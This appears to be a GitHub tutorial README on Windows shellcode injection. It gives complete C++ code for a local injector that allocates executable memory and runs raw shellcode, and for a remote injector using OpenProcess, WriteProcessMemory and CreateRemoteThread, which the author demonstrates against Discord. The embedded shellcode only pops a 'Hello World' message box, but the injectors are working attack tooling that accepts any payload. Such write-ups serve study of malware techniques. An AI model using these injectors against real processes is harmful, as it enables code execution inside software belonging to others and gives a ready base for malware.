# Introduction To Shellcode Injection Technique
![image](https://user-images.githubusercontent.com/107004485/181909423-28de4fc3-ab31-4330-ae55-43ad55d7b142.png)
- I Will Teach You How You Can Do A Shellcode Injector Using [CreateRemoteThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
## What's A Shellcode?
- Shellcode Used Like A Payload To Exploit A Process.
## How Shellcode Injectors Works?
- A Shellcode Injector Allows You To Inject A Shellcode In A Local Process Or A Remote Process.
# How I Can Inject A Shellcode Into A Local Process?
- Source Code Of My Program That Inject Our Shellcode Into A Local Process:
```C++
#include <Windows.h>
#include <iostream>

using namespace std;

int main(void) {

	unsigned char shellcode[] =
		"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
		"\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
		"\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
		"\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
		"\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
		"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
		"\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
		"\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
		"\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
		"\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
		"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
		"\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
		"\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
		"\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
		"\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
		"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
		"\x54\x53\xff\xd6\x57\xff\xd0";
    size_t shellcode_sz = sizeof(shellcode);
  
	  void* valloc = VirtualAlloc(0, shellcode_sz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	  // we will copy shellcode to valloc variable 
	  // shellcode_sz is the number of the characters to copy
	  memcpy(valloc, shellcode, shellcode_sz);
	  // we will send out valloc to a void function pointer  and and calling the void function from the pointer
	  ((void(*)())valloc) ();
	  return 0;
} 
```
  - When You Run The Source Code:
  		
	   ![image](https://user-images.githubusercontent.com/107004485/182494228-31cc6dbe-4e3d-411e-9d12-915f96c5960f.png)
		
  - The Explaination Of My Shellcode Injector In The Comments Of The Code
  	- More Informations About The Functions Used In My Source Code:
  		- [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
  		- [memcpy](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170)
  
  ![image](https://user-images.githubusercontent.com/107004485/182494021-8e3d6ca1-b31a-4a02-80af-82da3ce0181c.png)
# How I Can Inject A Shellcode In A Remote Process Like Discord lol
- Source Code Of My Program That Inject Our Shellcode Into A Remote Process:
```C++
#include "Windows.h"
#include <iostream>

using namespace std;

int main(void){
	unsigned char shellcode[] =
        "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
        "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
        "\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
        "\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
        "\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
        "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
        "\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
        "\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
        "\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
        "\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
        "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
        "\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
        "\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
        "\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
        "\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
        "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
        "\x54\x53\xff\xd6\x57\xff\xd0";

    HANDLE ProcessH;
    PVOID RemoteBuff;
    HANDLE cRemoteThread;
    string szProcess;

    size_t dwSize = sizeof(shellcode);

    DWORD pid = 0000; // the pid of the remote process

    ProcessH = OpenProcess(PROCESS_ALL_ACCESS, false, pid); // To Open An Existing Remote Process

    RemoteBuff = VirtualAllocEx(ProcessH, 0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(ProcessH, RemoteBuff, shellcode, dwSize, 0); 

    cRemoteThread = CreateRemoteThread(ProcessH, 0, 0, (LPTHREAD_START_ROUTINE)RemoteBuff, 0, 0, 0); // Create A Remote Thread In The Virtual Address Space Of The Remote Process
    
    CloseHandle(ProcessH);
    return EXIT_SUCCESS;
}
```
- More Informations About The Functions Used In My Source Code:
	- [OpenProces()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
	- [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
	- [WriteProcessMemory()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
	- [CreateRemoteThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
# I Will Try My Shellcode Injector In Discord HHHHHHHHHHHHHHH
- I Get The PID Of Discord From Process Hacker:
		
	![image](https://user-images.githubusercontent.com/107004485/182499893-a4ce3391-56e1-40bd-98d3-3a179fcb6d47.png)
- The Result:
		
	![image](https://user-images.githubusercontent.com/107004485/182500036-77e0548d-ac25-4d38-b899-feabd5dd6ed6.png)
# End Of Article
- I Hope You Leaned A Lot From This Article, Z
# Some Memes
![image](https://user-images.githubusercontent.com/107004485/182500429-0e961f81-1069-479a-849a-f6b46c2f2a60.png)

![image](https://user-images.githubusercontent.com/107004485/182500518-ff5c0615-f5ec-4b17-a9f7-cbffb22a8b73.png)